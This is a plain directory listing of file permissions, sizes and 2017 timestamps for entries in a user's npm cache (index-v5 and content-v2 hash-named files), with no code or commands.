-rw-r--r-- 1 root root 2594 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/d5/4b/e7e3758c2d19e1b8cf9a59f9a3bb013c0f8040f12ec62bfaa7fb9f279066
-rw-r--r-- 1 root root 960 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/91/8d/9d5442f11e519a7e565b68a73cf026cbf75c916c56739de362ff05d66549
-rw-r--r-- 1 root root 844 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/01/e2/c645d614e76972eba55c1868cc2cfa26b105a2396dc627ddec5a4af4d80c
-rw-r--r-- 1 root root 1160 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/f2/8d/78d5bb45c1a8ced30d9af1c497f90fb11a868bc1f41c4a58a7b059512fb2
-rw-r--r-- 1 root root 1776 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/59/82/428cb85113fe390bc49a566c97eaefecd77b79bc938dc161b1746ec6c957
-rw-r--r-- 1 root root 1269 Sep  1  2017 /home/tom/.npm/_cacache/index-v5/59/d1/000e4decef5f981d70cc009a05c6c541b090792f9f62581d579652e2e38e
-rw-r--r-- 1 root root 2552 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/3e/29/efa0ba3be1304a4c786f731b668d3d6526d57957d6fe7fe27ed3309c18b5
-rw-r--r-- 1 root root 1271 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/3e/2c/ac17b24babb657fa32e11551716127b06a06294843fec6a7508623400867
-rw-r--r-- 1 root root 1206 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/86/2d/1962ef423629c889ac798181bce4509ea1faec43c3100dd625114fa4644f
-rw-r--r-- 1 root root 2578 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/86/a2/5b27bb74c4b5717e38015bd570d651f9a9ebdd15044c34b5717193654f28
-rw-r--r-- 1 tom tom 3879 Sep  3  2017 /home/tom/.npm/_cacache/index-v5/67/5f/28c12321d8b73cabed8e5f6d334222738f3757d989855c298742f545c38d
-rw-r--r-- 1 root root 943 Sep  1  2017 /home/tom/.npm/_cacache/index-v5/51/f8/41969efcb7d8ab6d8f437352949103c05b7424d9dd35ae9941ca5fed73bc
-rw-r--r-- 1 root root 2594 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/3b/0b/21fa48e765e868d2d45e0ddaf3cffffe2b6ccdc671f646f5057a5129d7e2
-rw-r--r-- 1 root root 1235 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/dd/7e/6eac92368035b407842dec2e4a28acc9577e7cc546c7bc8886b3de9e096d
-rw-r--r-- 1 root root 2560 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/dd/50/286afc99bace92cde31d73618857aa64e0eea03a21e6918401e647e7ae13
-rw-r--r-- 1 root root 2549 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/14/5f/6e2956b950b124b9bf3d0e3b14a8ffb59cd858fd75ac433405cc316cc14f
-rw-r--r-- 1 root root 1254 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/14/e4/d59d98a347fb3a79ea8c3b01d86e8a89d40bf5403f86d99f8e4aa6569e61
-rw-r--r-- 1 root root 985 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/0e/91/95d9d49ade99bac3ad971c5aec8ea8f639d7e1d0c7a479b61131c2566446
-rw-r--r-- 1 root root 966 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/0e/b1/a7a53b1f1b42a4bfc112369c8d4ad59e579e02925d46bd579b3c2c5979b9
-rw-r--r-- 1 root root 2557 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/0e/bc/3e860ac298a0e1f2ebc7443600688e9009766fff3e452683186dee25bd1c
-rw-r--r-- 1 root root 1346 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/f5/03/5b6e6d258673ddb2cb406587836408937f0a9b860451fc39c531e87758a9
-rw-r--r-- 1 root root 2547 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/b9/85/a61e4faf2fa57d9503508bed591c594eb5609999d7fe0d23f010cd1c4cc5
-rw-r--r-- 1 root root 780 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/a7/e8/cf6900000d07970db69268ec41328070e859e0253863cb749290fa89757d
-rw-r--r-- 1 root root 2576 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/a7/02/2a512783001403565cf7460ec142510337da7589c82f0d17b3f0c10f204a
-rw-r--r-- 1 tom tom 3959 Sep  3  2017 /home/tom/.npm/_cacache/index-v5/ab/a3/6abc84291759cb5b5ed9f06186f33ea909a68cd960206d57e16032623327
-rw-r--r-- 1 root root 1190 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/ab/e4/fe05bc48ff8da0b7a185b0331606adca68619d66b07f6b9f5f128e532cd9
-rw-r--r-- 1 root root 2577 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/7c/c0/fef527977e33bd63fbef3b487377795187997ffd4a24f7dfd851344767ff
-rw-r--r-- 1 root root 1414 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/1a/e9/962f11d4b8c9ca35c273e7efe230139a385407219f8711c786d70b64c1e6
-rw-r--r-- 1 root root 1262 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/f8/00/f4ef62d0d1a0e5562fb6668e0c813bd2f752aa5f5d1aa577ae974058a780
-rw-r--r-- 1 root root 1228 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/60/8c/b74a2ae1c6978d635a1a21438c553d956a762176742b2749d09db964bf4d
-rw-r--r-- 1 root root 2580 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/60/60/921266f6a9624f9b2f1896296fde0b03c6c726da992cf5b2bf3491abaa28
-rw-r--r-- 1 root root 846 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/60/bf/4e9ff04c9d7d76201eb0377f94ce22dd8908b2be390951a420334909320c
-rw-r--r-- 1 tom tom 3899 Sep  3  2017 /home/tom/.npm/_cacache/index-v5/5a/6c/cbedfba7f1f2603383e2c9389a4536ad7d88a7498f9ccce633b760e037dd
-rw-r--r-- 1 root root 1246 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/5a/ce/73a9322c34591d828d038f4666ebcdfbf0cc7753b122aafc1c982fdd8760
-rw-r--r-- 1 root root 1221 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/21/5c/43bc4bbdabf8ae0454ee7075000f4ba27acf124106cdb71a445723bbc8c9
-rw-r--r-- 1 root root 2557 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/a8/05/549b4a73b2df921cfb1da13a113057ce79598cbe5cb03dd6f46b3f8d97f1
-rw-r--r-- 1 root root 1256 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/53/71/f65a0fdea1580c22f9e34cb189bc63209b38637f01bebcd4593417ed8ef0
-rw-r--r-- 1 root root 1214 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/0b/bf/4226971e16d707d9180cd9fe4d4c5d07b40fa7d4311fe932f69a7fce4e53
-rw-r--r-- 1 root root 1139 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/16/79/83331f1a66f5c9497cff359d35e38279e53ebcc3160d994c15d1d84523fd
-rw-r--r-- 1 root root 1261 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/a4/a1/43b9fb97b94dbeb422eaf339260e0e98ad90ff379dbbbb5817b695dd2c9f
-rw-r--r-- 1 root root 1229 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/5b/f3/f054e0f42a4b9a97a22c023acfe5fbb20fff19ec2e731bffca11de917312
-rw-r--r-- 1 root root 1237 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/78/47/e2620a606e750b9b1222b96129dfd84ec14c0a8057c2b7c0574e8ddb7095
-rw-r--r-- 1 root root 1311 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/9a/d0/f5426e38532f290a0d66ae9c5ac0d0e9ce2be796b263cb77c5479cb2020c
-rw-r--r-- 1 root root 2583 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/96/c5/cfd4f290453cd7201716a3217433fe76e994d06ad3a598a6ab5772d5280f
-rw-r--r-- 1 root root 1249 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/e2/b6/fadba77ee9bc54b6dfbe9ca7a3007e8ae23e97cd6dfb5843f57100b044c1
-rw-r--r-- 1 root root 905 Sep  1  2017 /home/tom/.npm/_cacache/index-v5/e2/b3/79553995dc0b29118b9cd4b20d17a51b94bd5ee83b172de60878854d7141
-rw-r--r-- 1 root root 1202 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/e2/74/ad069cd3ebfd6d2f7f8112545e91d61efec251f85be304e9924602ddcc8a
-rw-r--r-- 1 root root 1206 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/f0/f8/e1f49aa42a2a3ca5273a56a338234f78a5b5df18ccbed4a8c336bbc085c1
-rw-r--r-- 1 root root 2565 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/4f/4a/c432dbdaabe4d1a0e47519ed9d0df6b9c9b672157e02a8e1549737c07958
-rw-r--r-- 1 root root 1265 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/bf/03/d5dd5fa44593b3e2d24e270c89a4ebe5809a69837946acbe11b5f9ab29d0
-rw-r--r-- 1 root root 873 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/bf/6b/762283f64c0e5e6ce58895c2af530eb6630d447cab5de49f0c56820427f5
-rw-r--r-- 1 tom tom 3924 Sep  3  2017 /home/tom/.npm/_cacache/index-v5/40/cb/9c7967f3b8ca30bc891a3d867197a739fda2b6820f63e80be2af3b7e87f1
-rw-r--r-- 1 root root 1228 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/40/ed/5fc878f73b2a25d8fb52e2024573c25f99bf05bc1ef273925b090a3fd110
-rw-r--r-- 1 root root 867 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/11/2a/5a8bb050ce4e699510b88503c4201b81668aa89f6f73e20ccbcc0d5f5dc1
-rw-r--r-- 1 root root 2550 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/11/e1/1c483d2122bd9cb1fa851dc036984e3754849f699fe4eca57537ef5d33ee
-rw-r--r-- 1 root root 2607 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/11/96/1b874350c67532d80b504db99734fc862fdcb183613ab2283abb63a6d798
-rw-r--r-- 1 root root 1236 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/d9/cb/f9b314f2c9f5f017557ec7c0a50e788086142b22a530e51415b20d786817
-rw-r--r-- 1 root root 855 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/d9/33/2d3466c5787cf2a40c7654d73e8a02789d2c653ccbd5aa4c1c5fc1072ea6
-rw-r--r-- 1 root root 2543 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/57/b7/2772f8c4daa4b31074e03545f8e473b547e88ef3141501fe2a54e1abdfc4
-rw-r--r-- 1 tom tom 3874 Sep  3  2017 /home/tom/.npm/_cacache/index-v5/10/57/e3fa17a1f652a6cf6135ebb890a265e7cf69e516304acd7de023590df83c
-rw-r--r-- 1 root root 851 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/2c/bd/9df70b16e0ca1fb5609ab2b1071f9d9c59f57cbc5aad705508ef2525e506
-rw-r--r-- 1 root root 1018 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/04/66/da815125bba26af55f7eebb663bfc09982499d696eb20b2aae979ff6812c
-rw-r--r-- 1 root root 2579 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/33/61/b25f71e94c58e2b76f0a00ec021a6d5ec6bb015dedfbb236ed370841d698
-rw-r--r-- 1 root root 851 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/65/2b/5fb7ae48742e3b1e95a7f4f87a944689235ff756ee32b4291d53104b9993
-rw-r--r-- 1 root root 942 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/65/85/120d357aa437d6d0a792b294c1cc4954a3f2c7835e58f6d3eabb6506707d
-rw-r--r-- 1 root root 784 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/8b/13/6fa1a537142a270024f4b5610c19fa304cefd38be62f1ac225367f83a95d
-rw-r--r-- 1 root root 1251 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/bd/ed/546e61d5f58b9ab89a98448188d309390a5e13ec9306104afafe5ff71bf9
-rw-r--r-- 1 root root 1164 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/9d/e7/9b848fd4941d5c2e8e397f7a578c8eb67d15d71540e76f61efd5b15a13ca
-rw-r--r-- 1 root root 1382 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/42/97/2e75682976992f24616fba285bca7ce0f6cdfc6086b8d07bab652165d2a8
-rw-r--r-- 1 root root 1249 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/9f/da/f7ae5128341e8be6a414b2ff18919cb6c0b5e5392b7fe3b66b26448cf68a
-rw-r--r-- 1 root root 2567 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/e6/31/11eb65d70a004ba6dc4f967bae593980ef09d70ba81fd2af497387d1d59a
-rw-r--r-- 1 root root 1180 Sep  1  2017 /home/tom/.npm/_cacache/index-v5/54/e3/a602ba78f2b3b165b5854284686444ef86c770b55d4a48e5fa4db3bc5d86
-rw-r--r-- 1 root root 2561 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/a9/79/02670505f1767ea894bbe06196b46e6d240500de49465496832487cf505d
-rw-r--r-- 1 root root 1207 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/77/4a/e6300e7dcfd45167e8250c42c404715bd2c37108caf547d19d5ef60af6d9
-rw-r--r-- 1 root root 1242 Sep  1  2017 /home/tom/.npm/_cacache/index-v5/94/c4/8eec61a5521b980eef896f50b89aff63f02da1ecdb93c308c816c430578f
-rw-r--r-- 1 root root 789 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/c6/fc/0c82e6fea3443602e7c7659c85202fe263becfe2ba20ef85d7b1b8a07216
-rw-r--r-- 1 root root 982 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/0f/24/694eb1d66f72b0889700b706bb02de0d997df8154e08dd9be3fc7a1f0511
-rw-r--r-- 1 root root 880 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/0f/84/4fb16e16d8330cb434f876314801bbe88ef9d062b17d18612f132033fac8
-rw-r--r-- 1 tom tom 3932 Sep  3  2017 /home/tom/.npm/_cacache/index-v5/a2/f8/c61e11470f05a7de4ec5ee8f0cb5cc1fb6fa26f7b214394bdc7577ee7c60
-rw-r--r-- 1 root root 2565 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/99/7b/bb864e5ee467386404b7d703d97a34d09b8b19dadefbcc14f2414db1c0f3
-rw-r--r-- 1 root root 1221 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/5e/ce/ca0c5c0e033dcf812b3fad1cae23aababea11725485d0f62db00f0285294
-rw-r--r-- 1 root root 1221 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/5e/8b/a2077126b6cd4a19645aa64b15796c36d6d9a1e212acacb2fd181595d819
-rw-r--r-- 1 root root 1229 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/d1/ae/0f7015b43abc1dcab19418ee7a76f71deac26f5ce705ec6722b7db966712
-rw-r--r-- 1 root root 1033 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/d1/20/dc955dc23c17b4427f14b7091e5b2c5597a940f60ba37bc71418dde33458
-rw-r--r-- 1 root root 1238 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/35/68/c766d7ce81dc7c207ecdce1745d901bdd07c07cc2a7dcb97aa16ffc61b52
-rw-r--r-- 1 root root 2564 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/bb/3e/256be0e1ad86cb6af43f7a2b285999f990001322fd94509520d011bab8f5
-rw-r--r-- 1 root root 1092 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/23/e8/2a811e298ffc0f6b0de3ce99e4f31ab508a6d6e2263c1c111236d8caf2d2
-rw-r--r-- 1 root root 1249 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/23/f1/2f144eecd2cb130b6a46d528adddd07b4288f3aea88bfee2d81c35f5c97f
-rw-r--r-- 1 root root 1120 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/43/ed/92ea47ba7bbc1d4ac413941615afe71ed09f0c267ef293f7bdbf6ce6e0ac
-rw-r--r-- 1 root root 1205 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/bc/5a/0dad3f4fa6b9e9a9c97418439c79ad5299bee8c78fa2f9f1f07850f99bce
-rw-r--r-- 1 tom tom 3945 Sep  3  2017 /home/tom/.npm/_cacache/index-v5/bc/96/32683f7ffb7731d6518f96344b35c74b7e49ed661d40e28ab211841d1e09
-rw-r--r-- 1 root root 1265 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/46/b3/3d15bb50b75b21e94837be0b830f143588e46710a66a4d6e323a4c0bcfb3
-rw-r--r-- 1 root root 1309 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/a0/79/59284d9c02a269b27237d846be74bed4d0c68a0062f62cb9359ce0ca6c41
-rw-r--r-- 1 root root 3871 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/a0/c6/040205eebe8a1469c51bd2cf204508de0c8c99d31041c9481a8f7a10adb3
-rw-r--r-- 1 root root 2598 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/fd/51/5bf9d842e1ecfea484079ce86f5d7bf7ceddbcc1711c7b29270cb9913b31
-rw-r--r-- 1 root root 1036 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/d8/d3/8228994e1bfb6a03c7b586a7a39c1d93f70b7aa8df45f5b343609186f1e5
-rw-r--r-- 1 tom tom 3893 Sep  3  2017 /home/tom/.npm/_cacache/index-v5/18/a8/537518e1b9dae79504ee82cb10ef03038039fae1f826acce47d43c19d03a
-rw-r--r-- 1 root root 2564 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/ec/da/4497dc8d2813413abe1f1c72b66bd18f50b6f2f052a7c0eb0dd8c8130496
-rw-r--r-- 1 root root 2566 Sep  2  2017 /home/tom/.npm/_cacache/index-v5/cd/71/f68a6750f3db4df84a6f6c31eba19daed52dc3c2a615b66b97cea205353b
-rw-r--r-- 1 root root 817 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/69/b0/bf1852d0783ec94b05403978a38b9d741ba57dbcc41290e546e8cb61d731
-rw-r--r-- 1 root root 1200 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/8e/c3/ac789dc71d26628549c0a7b9b89daf64aebb013ac08a0a5159731f3ab02d
-rw-r--r-- 1 root root 914 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/05/ae/53cc1b3657fbd131404126c52ff9342768449fec6f2d999b2c9fe9b858cf
-rw-r--r-- 1 root root 1264 Aug 31  2017 /home/tom/.npm/_cacache/index-v5/c2/ea/6a93410c09a5caa16c875baa6eaf659f7d56386c36aa939a93c4f7e88cdd
-r--r--r-- 1 root root 2028 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/63/3c/2c83e3da42a502f52466022480f4208261de
-r--r--r-- 1 root root 4630 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/2b/85/8a52e5ecd516db897ac2be87487830698e23
-r--r--r-- 1 root root 6625 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/2b/32/7184e8992101177b28563fb5e7102acd0ca9
-r--r--r-- 1 root root 21598 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/13/e2/6d28ad6b0ffaa91312cd3bf708ed351e7233
-r--r--r-- 1 root root 16309 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/92/ba/d1f6d05bbb6bba22cca88bcd0ec894c2861e
-r--r--r-- 1 root root 2873 Sep  1  2017 /home/tom/.npm/_cacache/content-v2/sha1/92/8f/5d0f470d49342651ea6794b0857c100693f7
-r--r--r-- 1 root root 2096 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/b2/bf/4ee8514aae6165b4817829d21b2ef49904ec
-r--r--r-- 1 root root 4189 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/87/10/d7af0aa626f8fffa1ce00168545263255748
-r--r--r-- 1 root root 195402 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/fe/26/5a218ac6a57cfe854927e9d04c19825eddeb
-r--r--r-- 1 root root 1312 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/66/56/7e37043eeb4f04d91bd658c0cbefb55b8e04
-r--r--r-- 1 root root 1917 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/02/58/eae4d3d0c0974de1c169188ef0051d1d1988
-r--r--r-- 1 root root 1689 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/02/94/fb922bb9375153541c4f7096231f287c8af8
-r--r--r-- 1 root root 23931 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/48/d2/6d235589651704ac5916ca06001914266878
-r--r--r-- 1 root root 52532 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/03/2e/2253489cf8fce02666beca3d11ed7a2daed1
-r--r--r-- 1 root root 3099 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/79/e3/d58655346909fe6f0f45a5de68103b294d20
-r--r--r-- 1 root root 23402 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/07/05/7acbe2467b22042d36f98c5ad507054e95b1
-r--r--r-- 1 root root 2312 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/b0/0a/aa556dd8b44568150ec9d1b953f3f90cbb61
-r--r--r-- 1 root root 2475 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/55/29/a4d67654134edcc5266656835b0f851afcee
-r--r--r-- 1 root root 149345 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/93/c1/0d39eaa5b58415cbc4052f3e53e562b0b72c
-r--r--r-- 1 root root 5562 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/0a/00/2cc85707192a7e7946ceedc11155f60ec736
-r--r--r-- 1 root root 3383 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/f4/9b/e6b487894ddc40dcc94a322f611092e00d5e
-r--r--r-- 1 root root 3679 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/f4/74/ca5e6a9246d6fd8e0953cfa9b9c805afa78e
-r--r--r-- 1 root root 4552 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/20/f1/336481b083cd75337992a16971aa2d906947
-r--r--r-- 1 root root 7016 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/b5/fd/54220aa2bc5ab57aab7140c940754503c1a7
-r--r--r-- 1 root root 17174 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/29/6a/ca878a821816e5b85d0a285a99bcff4582f0
-r--r--r-- 1 root root 5137 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/71/c0/ee3b102de3f202f3b64f608d173fcba1a918
-r--r--r-- 1 root root 2053 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/19/ef/9874c4ae1c297bcf078fde63a09b66a84363
-r--r--r-- 1 root root 178650 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/19/40/445c661e19217bb3bf8245d9854aaef548db
-r--r--r-- 1 root root 6625 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/0c/f6/8bb9ddf5f2be7961c3a85178cb85dba78cb4
-r--r--r-- 1 root root 7958 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/9b/6a/a98eeb7253c4eedc4c1f6fdbca609901a961
-r--r--r-- 1 root root 2733 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/59/0c/61156b0ae2f4f0255732a158b266bc56b21d
-r--r--r-- 1 root root 5395 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/86/24/6758c7dd6d21a6474ff084a4740ec05eb21f
-r--r--r-- 1 root root 3582 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/67/53/5ebb694c1d52257457984665323f587e8d37
-r--r--r-- 1 root root 3842 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/7d/97/196f9d5baf7f6935e25985549edd2a6c2339
-r--r--r-- 1 root root 12699 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/f8/89/2abc8f9e627d42aedafbca66bf5ab99104ee
-r--r--r-- 1 root root 4348 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/6f/63/1aef336d6c46362b51764044ce216be3c051
-r--r--r-- 1 root root 1992 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/9a/5f/699051b1e7073328f2a008968b64ea2955d2
-r--r--r-- 1 root root 13973 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/98/5f/aa3e284b0273c793364a35c6737bd93905b9
-r--r--r-- 1 root root 2673 Sep  1  2017 /home/tom/.npm/_cacache/content-v2/sha1/4f/68/a1dc0ae58bd3fb95848c30324db75d64360b
-r--r--r-- 1 root root 2246 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/45/0d/4dc9fa70de732762fbd2d4a28981419a0ccf
-r--r--r-- 1 root root 12232 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/11/5f/9e3b6b3daf2959983cb38f149a2d40eb5d53
-r--r--r-- 1 root root 5395 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/ca/b1/0fb4909e441c82842eafe1ad646c81804410
-r--r--r-- 1 root root 3379 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/c8/ab/8c9223ba34888aa64a297b28853bec18da56
-r--r--r-- 1 root root 3269 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/df/60/4178005f522f15eb4490e7247a1bfaa67f8c
-r--r--r-- 1 root root 9022 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/57/83/b4e1c459f06fa5ca27f991f3d06e7a310359
-r--r--r-- 1 root root 2111 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/e3/03/a882b342cc3ee8ca513a79999734dab3ae2c
-r--r--r-- 1 root root 10147 Sep  1  2017 /home/tom/.npm/_cacache/content-v2/sha1/9d/a1/e980e3bd44fc5c93bf5ab3da3378d85e466b
-r--r--r-- 1 root root 93309 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/84/1f/53b87ffff4c7458189c35c8ae827e1169764
-r--r--r-- 1 root root 1863 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/94/80/ab20e94ffa1d9e80a804c7ea147611966b57
-r--r--r-- 1 root root 5970 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/e7/e0/a1f9ef43b4c8ba925c5c5a96e806d16873bb
-r--r--r-- 1 root root 16335 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/e7/31/531ca2ede27d188222427da17821d68ff4fc
-r--r--r-- 1 root root 1923 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/15/0e/20b756590ad3f91093f25a4f2ad8bff30ba3
-r--r--r-- 1 root root 6488 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/99/49/76cf6a5096a41162840492f0bdc5d6e7fb96
-r--r--r-- 1 root root 2156 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/99/78/ce317388c649ad8793028c3477ef044a8b51
-r--r--r-- 1 root root 2021 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/bb/93/5d48582cba168c06834957a54a3e07124f11
-r--r--r-- 1 root root 2331 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/97/88/57442c44749e4206613e37946205826abd80
-r--r--r-- 1 root root 2874 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/56/08/aeadfc00be6c2901df5f9861788de0d597c8
-r--r--r-- 1 root root 3662 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/b7/d1/13aee7a8dd27bd21133c4dc2529df1721eed
-r--r--r-- 1 root root 22869 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/ec/56/233868032909207170c39448e24449dd1fc4
-r--r--r-- 1 root root 4160 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha1/fa/f5/1b9eb74aaef3b3acf4ad5f61abf24cb7b93e
-r--r--r-- 1 root root 11325 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/08/ee/1ef1ce730bb519d9901bd45bb67c6d4cadaf9819cabd0fa8d800187352c2dfb80f2debbbf9f8399ccd226bc7e17ac79c0d8989ef3a80608d09ac550af1e1
-r--r--r-- 1 root root 20562 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/be/ea/7cb188796ad3191660ebede45385a662ec0723f4e82a896aebe217db5acf3a94b8022cc966b39afb888efe105a2fcf3985cab4d68cdf3b30c2b396a057c9
-r--r--r-- 1 root root 1425 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/e5/b3/b333a477a39339cf9f0493d9726489dbf4b62016bb3d68ca343ae494c7a11b022adba4ee68b067382e5f53914a578dc6f00ba9ddbd14ee63e9a7ca5a6600
-r--r--r-- 1 root root 420 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/13/81/3ef5bdd5156055912385aca543b133c0956c431262f2754c79dd2540214292369df02a19ba2dc0bda92a88cdba21c4545b1789871e2aa1ae940c7547dba0
-r--r--r-- 1 root root 8851 Aug 31  2017 /home/tom/.npm/_cacache/content-v2/sha512/90/ab/cd267e8c9bdde001ccd654983bc07fb019858dac31dd5afa54987c84b200ad230c28ddba8fb55e2d479b6e3da5214cea3f92f855c1df17c303a59466246e
